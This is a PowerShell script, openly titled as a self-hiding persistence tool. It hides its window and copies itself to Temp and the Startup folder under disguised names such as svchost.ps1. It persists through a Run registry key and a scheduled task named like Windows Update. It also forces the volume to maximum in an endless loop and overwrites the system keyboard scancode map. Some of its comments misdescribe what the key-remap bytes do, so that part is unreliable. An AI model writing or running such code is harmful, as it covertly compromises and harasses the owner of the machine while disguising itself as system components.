# Self-hiding and persistence script
param()

# Hide the PowerShell console window when running
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# Get current script path and create persistence location
$scriptPath = $MyInvocation.MyCommand.Path
$persistencePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.ps1"
$hiddenPath = "$env:TEMP\winupdate.ps1"

# Copy script to hidden location
Copy-Item $scriptPath $hiddenPath -Force
Copy-Item $scriptPath $persistencePath -Force

# Set file to hidden
$file = Get-Item $hiddenPath -Force
$file.Attributes = $file.Attributes -bor [System.IO.FileAttributes]::Hidden

# Add to registry for additional persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hiddenPath`"" -PropertyType String -Force

# Function to permanently max out volume
function Set-MaxVolume {
    Add-Type -TypeDefinition @'
    using System;
    using System.Runtime.InteropServices;
    public class Audio {
        [DllImport("winmm.dll")]
        public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume);
    }
'@
    [Audio]::waveOutSetVolume([IntPtr]::Zero, 0xFFFF)
}

# Function to remap keys
function Set-KeyRemapping {
    # Registry path for keyboard remapping
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Keyboard Layout"
    
    # Create binary data for remapping (S->Console, T->New Tab)
    # S key (0x1F) -> Console (scancode for Win+R then cmd)
    # T key (0x14) -> New Tab (Ctrl+T)
    $remapData = [byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x1F,0x00,0x3A,0x00,0x00,0x00,0x14,0x00,0x2C,0x00,0x00,0x00)
    
    New-ItemProperty -Path $regPath -Name "Scancode Map" -Value $remapData -PropertyType Binary -Force
}

# Execute the functions
Set-MaxVolume
Set-KeyRemapping

# Create a scheduled task for additional persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$hiddenPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -RunLevel Highest -Force

# Start monitoring loop to maintain settings
while ($true) {
    Set-MaxVolume
    Start-Sleep -Seconds 5
}